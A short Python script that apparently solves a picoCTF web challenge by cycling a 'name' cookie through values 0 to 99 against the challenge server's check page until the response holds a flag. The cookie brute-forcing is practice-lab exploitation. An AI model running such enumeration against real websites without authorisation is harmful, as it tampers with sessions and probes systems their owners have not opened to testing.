import requests 
url = 'http://mercury.picoctf.net:21485/check'
for i in range(100):
     cookies = {'name': str(i)}
     r = requests.get(url, cookies=cookies)
     if 'picoCTF{' in r.text:
          print(r.text)
          break

